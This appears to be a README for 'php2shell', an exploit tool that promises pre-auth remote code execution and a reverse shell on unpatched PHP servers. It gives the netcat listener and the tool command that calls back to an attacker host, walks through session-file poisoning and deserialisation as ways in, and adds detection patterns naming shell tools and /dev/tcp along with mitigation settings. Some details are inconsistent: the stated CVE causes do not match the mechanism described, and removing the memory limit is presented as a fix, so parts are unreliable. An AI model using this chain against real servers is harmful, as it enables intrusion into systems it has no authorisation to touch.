php2shell

Pre-auth remote code execution & reverse shell for the two critical PHP core vulnerabilities patched on 2026-10-21.

CVE-2026-109618 — RCE via OOM corruption CVE-2026-109619 — RCE via stale global state

CVSS v4.0 9.2 Critical Auth none Affected PHP 5.4 → 8.5.x Fixed in 8.5.12 · 8.4.27 · 8.3.36 · 8.2.35 Dependencies none

Quick start

# terminal 1
nc -lvnp 4444

# terminal 2
python3 php2shell.py https://target.example.com/index.php -l 10.0.0.5 -p 4444

One URL in, a reverse shell out. Python 3.8+, standard library only — no dependency, no build step, no target-side helper file.

The two bugs

CVETitleSummary
CVE-2026-109618 RCE via OOM corruption An out-of-memory condition can interrupt PHP while internal request data is only partially initialised. Request cleanup may then treat the invalid data as valid.
CVE-2026-109619 RCE via stale global state Request-owned internal state can survive after its backing memory has been freed. A later request handled by the same worker may use that stale state before normal initialisation resets it.

Mechanism

The reachable surface is the session upload-progress handler in ext/session/session.c, which has three independent problems:

1 · Session fixation (pre-auth)

MULTIPART_EVENT_FORMDATA copies the POST-body field whose name is PHP's session.name into the progress session id, ignoring session.use_only_cookies. The attacker picks the session id, and therefore the on-disk session file path.

2 · Unvalidated file name

MULTIPART_EVENT_FILE_START stores the raw uploaded file name into the session data, with no sanitisation at all.

3 · Attacker-controlled content

The POST-body field named PHP_SESSION_UPLOAD_PROGRESS becomes the session key upload_progress_<value>, stored verbatim.

Because the progress data is serialised into the attacker's own session file, and PHP's session serialiser is not a sandbox, the attacker fully controls the content of a file whose name is fully predictable: <session.save_path>/sess_<chosen session id>.

Strategies

Strategy 1 — session poisoning + inclusion sink

The progress key can carry a complete <?php ... ?> block, and the php session serialiser writes it verbatim. An include()/ require() sink then executes it. Works against any target with such a sink, and needs no knowledge of the target's PHP build.

Strategy 2 — serialiser handler mismatch

When two directories use different session.serialize_handler values, a file name containing | shifts the parse so attacker bytes are deserialised as an object whose __destruct runs — even though the decode returns FAILURE.

Check a target first

Before running anything, check whether the target still serves a vulnerable PHP. The OpenAI php2shell-checker does exactly that, from the version alone:

npx phpcheck.js https://target.example.com
# VULNERABLE  the PHP version is at or below the patched version of its branch
# OK          the PHP version is patched — this chain will not work
# UNKNOWN     the version could not be determined

The checker only looks at the version, so it says nothing about the session.upload_progress configuration. The PoC reports that part itself (session fixation accepted by the target, no include() sink detected, …).

Detection

Alert when a PHP worker process (php-fpm, php-cgi, lsphp, httpd) spawns /bin/sh, /bin/bash, cmd.exe, python, curl, wget or nc, and when a command line contains /dev/tcp/, fsockopen or mkfifo. Also grep the web access logs for PHP_SESSION_UPLOAD_PROGRESS.

Mitigation

Update PHP to 8.5.12 / 8.4.27 / 8.3.36 / 8.2.35. Until then, per the official advisory:

; CVE-2026-109619 — blocks the confirmed session paths.
; Set it before request parsing and RESTART every worker.
session.upload_progress.enabled = 0

; CVE-2026-109618 — removes the controllable memory-limit failure.
memory_limit = -1
post_max_size = 8M
Authorised security testing and education only. Use only against systems you own or have explicit written permission to test.
